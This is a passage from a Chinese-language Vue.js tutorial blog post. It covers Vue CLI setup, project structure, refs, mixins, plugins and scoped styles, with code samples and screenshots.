class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./main.js&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144824.png" alt="  "></p>
<p>当我们运行 index.html，发现什么都没有，并且控制台还报错，这是因为只有脚手架才支持组件开发。</p>
<h1 id="四、Vue-CLI脚手架的使用"><a href="#四、Vue-CLI脚手架的使用" class="headerlink" title="四、Vue CLI脚手架的使用"></a>四、Vue CLI脚手架的使用</h1><h2 id="1-使用步骤"><a href="#1-使用步骤" class="headerlink" title="1. 使用步骤"></a>1. 使用步骤</h2><p><strong>① 全局安装 <code>@vue/cli</code></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g @vue/cli</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>② 切换到你要创建项目的目录，然后使用命令创建项目</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vue create xxxx</span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144829.png" alt="  "></p>
<hr>
<p><strong>③ 选择使用vue的版本</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144832.png" alt="  "></p>
<p><strong>④ 启动项目：npm run serve</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144834.png" alt="  "></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144836.png" alt="  "></p>
<hr>
<p><strong>⑤ 暂停项目：<code>Ctrl+C</code></strong></p>
<hr>
<h2 id="2-分析脚手架结构"><a href="#2-分析脚手架结构" class="headerlink" title="2. 分析脚手架结构"></a>2. 分析脚手架结构</h2><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144840.png" alt="  "></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.文件目录</span><br><span class="line">├── node_modules </span><br><span class="line">├── public</span><br><span class="line">│   ├── favicon.ico: 页签图标</span><br><span class="line">│   └── index.html: 主页面</span><br><span class="line">├── src</span><br><span class="line">│   ├── assets: 存放静态资源</span><br><span class="line">│   │   └── logo.png</span><br><span class="line">│   │── component: 存放组件</span><br><span class="line">│   │   └── HelloWorld.vue</span><br><span class="line">│   │── App.vue: 汇总所有组件</span><br><span class="line">│   └── main.js: 入口文件</span><br><span class="line">├── .gitignore: git版本管制忽略的配置</span><br><span class="line">├── babel.config.js: babel的配置文件</span><br><span class="line">├── package.json: 应用包配置文件 </span><br><span class="line">├── README.md: 应用描述文件</span><br><span class="line">└── package-lock.json: 包版本控制文件</span><br></pre></td></tr></table></figure>






<hr>
<h2 id="3-单文件组件案例重写"><a href="#3-单文件组件案例重写" class="headerlink" title="3. 单文件组件案例重写"></a>3. 单文件组件案例重写</h2><p><strong>将上述的单文件案例迁移至脚手架中</strong></p>
<p><strong>① 将 School.vue 与 Student.vue 加入 components</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144845.png" alt="  "></p>
<p><strong>② App.vue 引入组件并使用</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144847.png" alt="  "></p>
<p><strong>③ index.html</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 针对IE浏览器的特殊配置，含义是让IE浏览器以最高渲染级别渲染页面 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 开启移动端的理想端口 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 配置页签图标 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 配置网页标题 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>&lt;%= htmlWebpackPlugin.options.title %&gt;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 容器 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>运行效果：</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144851.png" alt="  "></p>
<hr>
<h1 id="五、CLI配置修改"><a href="#五、CLI配置修改" class="headerlink" title="五、CLI配置修改"></a>五、CLI配置修改</h1><h2 id="1-默认配置修改"><a href="#1-默认配置修改" class="headerlink" title="1. 默认配置修改"></a>1. 默认配置修改</h2><ul>
<li>使用 <code>vue inspect &gt; output.js</code> 可以查看Vue脚手架的默认配置</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144855.png" alt="  "></p>
<ul>
<li><code>vue.config.js</code> 是一个可选的配置文件，如果项目的（和 <code>package.json</code> 同级的）根目录中存在这个文件，那么它会被 <code>@vue/cli-service</code> 自动加载</li>
<li>使用 vue.config.js 可以对脚手架进行个性化定制，详见<a href="https://cli.vuejs.org/zh/config/#vue-config-js">配置参考 | Vue CLI</a></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">	<span class="attr">pages</span>: &#123;</span><br><span class="line">		<span class="attr">index</span>: &#123;</span><br><span class="line">			<span class="comment">// 入口</span></span><br><span class="line">			<span class="attr">entry</span>: <span class="string">&#x27;src/index/main.js&#x27;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="comment">// 关闭语法检查</span></span><br><span class="line">	<span class="attr">lineOnSave</span>:<span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="2-ref属性"><a href="#2-ref属性" class="headerlink" title="2. ref属性"></a>2. ref属性</h2><p><strong>ref属性：</strong></p>
<ul>
<li>被用来给元素或子组件注册引用信息（id的替代者）</li>
<li>应用在html标签上获取的是真实DOM元素，应用在组件标签上获取的是组件实例对象（vc）</li>
<li>使用方式：<br> ①  打标识：<code>&lt;h1 ref=&quot;xxx&quot;&gt;&lt;/h1&gt; 或 &lt;School ref=&quot;xxx&quot;&gt;&lt;/School&gt;</code><br>  ② 获取：<code>this.$refs.xxx</code></li>
</ul>
<p><strong>测试案例：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span> <span class="attr">ref</span>=<span class="string">&quot;title&quot;</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">School</span> <span class="attr">ref</span>=<span class="string">&quot;sch&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;show&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>点我输出ref<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">import</span> <span class="title class_">School</span> <span class="keyword">from</span> <span class="string">&#x27;./components/School.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">name</span>:<span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">components</span>: &#123; <span class="title class_">School</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="attr">msg</span>:<span class="string">&#x27;欢迎学习Vue！&#x27;</span></span></span><br><span class="line"><span class="language-javascript">				&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">show</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">title</span>)</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">sch</span>)</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">btn</span>)</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">   &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144904.png" alt="  "></p>
<hr>
<h2 id="3-mixin混入"><a href="#3-mixin混入" class="headerlink" title="3. mixin混入"></a>3. mixin混入</h2><p><strong>mixin（混入）：</strong></p>
<ul>
<li><p>功能：可以把多个组件共用的配置提取成一个混入对象</p>
</li>
<li><p>使用方式：</p>
</li>
</ul>
<p>① 定义混入</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> mixin = &#123;</span><br><span class="line"></span><br><span class="line">	<span class="title function_">data</span>(<span class="params"></span>)&#123;</span><br><span class="line">	....</span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">methods</span>:&#123;</span><br><span class="line">	....</span><br><span class="line">	&#125;</span><br><span class="line">	....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>② 引入混入</p>
<blockquote>
<p>   局部混入：<code>mixins:[&#39;xxx&#39;]</code><br>   全局混入：<code>Vue.mixin(xxx)</code></p>
</blockquote>
<h3 id="1-局部混入"><a href="#1-局部混入" class="headerlink" title="1. 局部混入"></a>1. 局部混入</h3><p><strong><code>src/mixin.js</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> mixin = &#123;</span><br><span class="line">	<span class="attr">methods</span>: &#123;</span><br><span class="line">		<span class="title function_">showName</span>(<span class="params"></span>) &#123;</span><br><span class="line">			<span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello~&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>src/components/School.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span> @<span class="attr">click</span>=<span class="string">&quot;showName&quot;</span>&gt;</span>学校姓名：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>   </span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//引入混入</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">import</span> &#123;mixin&#125; <span class="keyword">from</span> <span class="string">&#x27;../mixin&#x27;</span></span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">name</span>:<span class="string">&#x27;School&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">name</span>:<span class="string">&#x27;家里蹲&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">address</span>:<span class="string">&#x27;重庆&#x27;</span></span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">mixins</span>:[mixin]</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong><code>src/components/Student.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span> @<span class="attr">click</span>=<span class="string">&quot;showName&quot;</span>&gt;</span>学生姓名：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生性别：&#123;&#123;sex&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>   </span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//引入混入</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">import</span> &#123;mixin&#125; <span class="keyword">from</span> <span class="string">&#x27;../mixin&#x27;</span></span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">name</span>:<span class="string">&#x27;Student&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">name</span>:<span class="string">&#x27;划水艺术家&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span></span></span><br><span class="line"><span class="language-javascript">		 &#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">mixins</span>:[mixin]</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-全局混入"><a href="#2-全局混入" class="headerlink" title="2. 全局混入"></a>2. 全局混入</h3><p><strong><code>src/main.js</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;mixin&#125; <span class="keyword">from</span> <span class="string">&#x27;./mixin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">mixin</span>(mixin)</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">	<span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span><br><span class="line">	<span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>备注</strong>：</p>
<ul>
<li>组件和混入对象含有<code>同名选项</code>时，这些选项将以恰当的方式进行“合并”，在发生冲突时以<code>组件优先</code>。</li>
<li>同名生命周期钩子将合并为一个数组，因此都将被调用。另外，混入对象的钩子将在组件自身钩子之前调用。</li>
</ul>
</blockquote>
<hr>
<h2 id="4-plugin插件"><a href="#4-plugin插件" class="headerlink" title="4. plugin插件"></a>4. plugin插件</h2><p><strong>插件：</strong></p>
<ul>
<li>功能：用于增强Vue</li>
<li>本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据</li>
<li>定义插件：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">plugin.<span class="property">install</span> = <span class="keyword">function</span> (<span class="params">Vue, options</span>) &#123;</span><br><span class="line">	<span class="comment">// 1. 添加全局过滤器</span></span><br><span class="line">	<span class="title class_">Vue</span>.<span class="title function_">filter</span>(....)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 2. 添加全局指令</span></span><br><span class="line">	<span class="title class_">Vue</span>.<span class="title function_">directive</span>(....)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 3. 配置全局混入</span></span><br><span class="line">	<span class="title class_">Vue</span>.<span class="title function_">mixin</span>(....)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 4. 添加实例方法</span></span><br><span class="line">	<span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$myMethod</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;...&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$myProperty</span> = xxxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>使用插件：<code>Vue.use(plugin)</code></li>
</ul>
<p><strong>测试案例：</strong></p>
<p><strong><code>src/myPlugin.js</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">	<span class="title function_">install</span>(<span class="params">Vue, x, y, z</span>)&#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(x,y,z)</span><br><span class="line">		<span class="comment">//全局过滤器</span></span><br><span class="line">		<span class="title class_">Vue</span>.<span class="title function_">filter</span>(<span class="string">&#x27;mySlice&#x27;</span>,<span class="keyword">function</span>(<span class="params">value</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> value.<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">4</span>)</span><br><span class="line">		&#125;)</span><br><span class="line"></span><br><span class="line">		<span class="comment">//定义混入</span></span><br><span class="line">		<span class="title class_">Vue</span>.<span class="title function_">mixin</span>(&#123;</span><br><span class="line">			<span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> &#123;</span><br><span class="line">					<span class="attr">x</span>:<span class="number">100</span>,</span><br><span class="line">					<span class="attr">y</span>:<span class="number">200</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;)</span><br><span class="line"></span><br><span class="line">		<span class="comment">//给Vue原型上添加一个方法（vm和vc就都能用了）</span></span><br><span class="line">		<span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hello</span> = <span class="function">()=&gt;</span>&#123;<span class="title function_">alert</span>(<span class="string">&#x27;你好啊&#x27;</span>)&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong><code>src/main.js</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> myPlugin <span class="keyword">from</span> <span class="string">&#x27;./myPlugin &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(myPlugin ,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">	<span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span><br><span class="line">	<span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<hr>
<h2 id="5-scoped样式"><a href="#5-scoped样式" class="headerlink" title="5. scoped样式"></a>5. scoped样式</h2><p><strong>scoped样式：</strong></p>
<ul>
<li>作用：让样式在局部生效，防止冲突</li>
<li>写法：<code>&lt;style scoped&gt;</code></li>
</ul>
<blockquote>
<p><strong>scoped样式一般不会在App.vue中使用</strong></p>
</blockquote>
<p><strong>测试案例：</strong></p>
<p><strong><code>src/components/School.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;Demo&#x27;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名称：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">name</span>:<span class="string">&#x27;School&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">name</span>:<span class="string">&#x27;家里蹲&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">address</span>:<span class="string">&#x27;重庆&#x27;</span></span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.Demo</span>&#123;</span></span><br><span class="line"><span class="language-css">	<span class="attribute">background</span>: orange;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong><code>src/components/Student.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;Demo&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生姓名：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生年龄：&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123;mixin&#125; <span class="keyword">from</span> <span class="string">&quot;@/mixin&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">name</span>:<span class="string">&#x27;Student&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">name</span>:<span class="string">&#x27;划水艺术家&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">age</span>:<span class="number">20</span></span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"> <span class="selector-class">.Demo</span>&#123;</span></span><br><span class="line"><span class="language-css">   <span class="attribute">background</span>: red;</span></span><br><span class="line"><span class="language-css"> &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span 